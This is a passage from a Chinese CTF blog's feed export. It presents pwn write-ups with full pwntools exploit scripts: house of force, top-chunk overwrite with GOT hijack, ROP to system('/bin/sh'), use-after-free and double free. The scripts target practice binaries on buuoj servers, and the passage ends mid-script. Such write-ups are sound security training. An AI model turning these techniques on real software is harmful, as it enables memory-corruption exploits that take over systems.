title="利用思路"></a>利用思路</h3><ul><li>申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>local_file  = <span class="hljs-string">'./gyctf_2020_force'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29457</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,date)</span>:</span>    sla(<span class="hljs-string">'2:puts'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    ru(<span class="hljs-string">'bin addr 0x'</span>)    heapaddr = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)    info_addr(<span class="hljs-string">'heapaddr'</span>,heapaddr)    sa(<span class="hljs-string">'content'</span>,str(date))    <span class="hljs-keyword">return</span> heapaddrpayload = <span class="hljs-number">0x30</span> * <span class="hljs-string">'a'</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">'111'</span>) + <span class="hljs-number">0x200ff0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = libc_base + <span class="hljs-number">0x3c4b10</span>heapaddr = add(<span class="hljs-number">0x30</span>,payload)size = malloc_hook-(heapaddr + <span class="hljs-number">0x30</span>) - <span class="hljs-number">0x10</span> - <span class="hljs-number">0x8</span> <span class="hljs-number">-0x8</span> <span class="hljs-number">-0x8</span>print(<span class="hljs-string">'size----&gt;'</span>+hex(size))add(size,<span class="hljs-string">'a'</span>)rce = rce16[<span class="hljs-number">1</span>] + libc_basepayload = p64(<span class="hljs-number">0</span>) + p64(rce) + p64(libc_base + libc.symbols[<span class="hljs-string">'__libc_realloc'</span>] + realloc[<span class="hljs-number">1</span>])add(<span class="hljs-number">0x20</span>,payload)sla(<span class="hljs-string">'2:puts'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'30'</span>)<span class="hljs-comment"># dbg()</span>itr()</code></pre></div><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>这个题是一个十分精妙的题，漏洞出现在程序初始化。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpy是以<code>\x00</code>来判断一个字符串是否结束的。<br>在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会<strong>把这个堆块的地址也给复制上去</strong>，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去<code>0xffffffff</code>,就可以改到top chunk的size位。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>leak堆块base</li><li>修改top chunk size</li><li>hof到heaplist处</li><li>给heaplist写上free got，用edit，修改其为puts</li><li>泄漏libc地址</li><li>修改free got 为system，然后指向<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bcloud_bctf_2016'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27301</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span><span class="hljs-params">(name)</span>:</span>    sa(<span class="hljs-string">'name'</span>,str(name))    ru(<span class="hljs-string">'b'</span>)    heapbase = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x8</span>    info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)    <span class="hljs-keyword">return</span> heapbase<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">org</span><span class="hljs-params">(org,host)</span>:</span>    sa(<span class="hljs-string">'Org:'</span>,str(org))    sla(<span class="hljs-string">'Host:'</span>,str(host))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'option---&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'length'</span>,str(size))    sa(<span class="hljs-string">'content:'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(id,content)</span>:</span>    sla(<span class="hljs-string">'---&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'id'</span>,str(id))    sa(<span class="hljs-string">'the new content'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'-&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'id'</span>,str(id))context.log_level = <span class="hljs-string">'debug'</span>sizelist = <span class="hljs-number">0x804B0A0</span>heaplist = <span class="hljs-number">0x804B120</span>heapbase = name(<span class="hljs-string">'a'</span> * (<span class="hljs-number">0x40</span><span class="hljs-number">-1</span>) + <span class="hljs-string">'b'</span>)top = heapbase + <span class="hljs-number">0xd8</span>info_addr(<span class="hljs-string">'top'</span>,top)org(<span class="hljs-string">'b'</span>*<span class="hljs-number">0x40</span>,p32(<span class="hljs-number">0xffffffff</span>)) <span class="hljs-comment">#chang top chunk size</span>size = heaplist - top - <span class="hljs-number">0x10</span>add(size,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'\n'</span>)payload = p32(<span class="hljs-number">0</span>) + p32(elf.got[<span class="hljs-string">'free'</span>]) + p32(elf.got[<span class="hljs-string">'atoi'</span>])  +p32(<span class="hljs-number">0x804B128</span>+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>) + <span class="hljs-string">'/bin/sh\x00'</span>edit(<span class="hljs-number">1</span>,payload + <span class="hljs-string">'\n'</span>)puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]edit(<span class="hljs-number">1</span>,p32(puts_plt) + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">2</span>)io.recv(<span class="hljs-number">1</span>)io.recv(<span class="hljs-number">1</span>)atoi = uu32(r(<span class="hljs-number">4</span>))info_addr(<span class="hljs-string">'atoi'</span>,atoi)libc = LibcSearcher(<span class="hljs-string">'atoi'</span>,atoi)libc_base = atoi - libc.dump(<span class="hljs-string">'atoi'</span>)system = libc_base + libc.dump(<span class="hljs-string">'system'</span>)info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)edit(<span class="hljs-number">1</span>,p32(system) + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">3</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>House系列</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF安恒月赛(4th)</title>
    <link href="/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <url>/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-pwn"><a href="#DASCTF安恒月赛-pwn" class="headerlink" title="DASCTF安恒月赛-pwn"></a>DASCTF安恒月赛-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开赛了，有点事情没打，晚上复现了一下。</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/ctf/work/ahys/echo server/test'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>程序很简单，经典栈溢出，rop利用即可。<br>但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，<br>调试发现：<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。<br>解决办法：还是加个ret，让栈对其即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./test'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>remote_libc = <span class="hljs-string">'./libc.so.6'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    <span class="hljs-comment"># io = remote('node3.buuoj.cn',25390)</span>    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()pop_rdi = <span class="hljs-number">0x0000000000400823</span><span class="hljs-comment"># : pop rdi ; ret</span>offset = <span class="hljs-number">136</span>start = <span class="hljs-number">0x4005C0</span>ret = <span class="hljs-number">0x0400768</span>sla(<span class="hljs-string">'how long is your name:'</span>,<span class="hljs-string">'500'</span>)payload = <span class="hljs-string">'\x00'</span> * offset + flat([ret,pop_rdi,elf.got[<span class="hljs-string">'read'</span>],elf.plt[<span class="hljs-string">'printf'</span>],start])<span class="hljs-comment"># dbg()</span>sla(<span class="hljs-string">'s you name?'</span>,payload)ru(<span class="hljs-string">'hello '</span>)read = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'printf'</span>,read)libc_base = read - libc.symbols[<span class="hljs-string">'read'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)binsh = libc_base  + libc.search(<span class="hljs-string">"/bin/sh"</span>).next()system = libc_base + libc.sym[<span class="hljs-string">'system'</span>]sla(<span class="hljs-string">'how long is your name: '</span>,<span class="hljs-string">'500'</span>)payload = <span class="hljs-string">'\x00'</span> * offset + flat([ret,pop_rdi,binsh,system])<span class="hljs-comment"># rec = 0x4f322 + libc_base</span><span class="hljs-comment"># dbg()</span>sla(<span class="hljs-string">'s you name?'</span>,payload)itr()</code></pre></div><h2 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h2><div class="hljs"><pre><code class="hljs python">s = <span class="hljs-string">'akhb~chdaZrdaZudqduvdZvvv|'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">26</span>):    flag += chr((ord(s[i]) - <span class="hljs-number">1</span>) ^ <span class="hljs-number">6</span>)print(flag)</code></pre></div><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>直接爆破了。</p><div class="hljs"><pre><code class="hljs python">s = [<span class="hljs-number">38</span>,<span class="hljs-number">44</span>,<span class="hljs-number">33</span>,<span class="hljs-number">39</span>,<span class="hljs-number">59</span>,<span class="hljs-number">35</span>,<span class="hljs-number">34</span>,<span class="hljs-number">115</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">113</span>,<span class="hljs-number">33</span>,<span class="hljs-number">36</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">35</span>,<span class="hljs-number">120</span>,<span class="hljs-number">38</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">113</span>,<span class="hljs-number">38</span>,<span class="hljs-number">34</span>,<span class="hljs-number">113</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">36</span>,<span class="hljs-number">112</span>,<span class="hljs-number">115</span>,<span class="hljs-number">118</span>,<span class="hljs-number">121</span>,<span class="hljs-number">112</span>,<span class="hljs-number">35</span>,<span class="hljs-number">37</span>,<span class="hljs-number">121</span>,<span class="hljs-number">61</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>):    flag = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">38</span>):        flag += chr(s[j] ^ i)    <span class="hljs-keyword">if</span> flag[:<span class="hljs-number">4</span>] == <span class="hljs-string">'flag'</span>:        print(flag)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
      <tag>rop</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uaf和double free</title>
    <link href="/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <url>/2020/04/25/uaf%E5%92%8Cdouble%20free/</url>
    
    <content type="html"><![CDATA[<h1 id="uaf和double-free"><a href="#uaf和double-free" class="headerlink" title="uaf和double free"></a>uaf和double free</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始打算入门堆，简单记录几道相关的题。</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>题目较为简单存在后门函数，利用uaf漏洞攻击即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./hacknote'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27892</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sl(<span class="hljs-string">'1'</span>)    ru(<span class="hljs-string">'Note size '</span>)    sl(str(size))    ru(<span class="hljs-string">'Content :'</span>)    sl(str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sl(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sl(str(index))ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-string">'aaaa'</span>)ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-string">'bbbb'</span>)ru(<span class="hljs-string">'Your choice :'</span>)dele(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'Your choice :'</span>)dele(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">8</span>,p32(elf.symbols[<span class="hljs-string">'magic'</span>]))ru(<span class="hljs-string">'Your choice :'</span>)show(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>题目有system函数，并且也有<code>/bin/sh\x00</code> ，当时在构造这个<code>/bin/sh\x00</code>的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./ACTF_2019_babyheap'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>debug = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27341</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'Your choice: '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size: \n'</span>,str(size))    sa(<span class="hljs-string">'content: \n'</span>,str(content)) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index: \n'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'3'</span>)sla(<span class="hljs-string">'index: \n'</span>,str(index))add(<span class="hljs-number">32</span>,<span class="hljs-string">'aaaaaaaa'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">32</span>,<span class="hljs-string">'bbbbbbbb'</span>) <span class="hljs-comment">#1</span>dele(<span class="hljs-number">0</span>)dele(<span class="hljs-number">1</span>)binsh = <span class="hljs-number">0x602010</span>add(<span class="hljs-number">16</span>,flat(binsh,elf.plt[<span class="hljs-string">'system'</span>]))<span class="hljs-comment"># dbg()</span>show(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。<br>改<code>__free_hook</code>为system即可。<code>__free_hook</code>的参数正好是堆块的date，较好控制。<br>（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。）</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./ACTF_2019_message'</span><span class="hljs-comment"># local_libc  = '/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="hljs-comment"># remote_libc = local_libc # '../libc.so.6'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    <span class="hljs-comment"># libc = ELF(local_libc)</span><span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25390</span>)    <span class="hljs-comment"># libc = ELF(remote_libc)</span>elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, 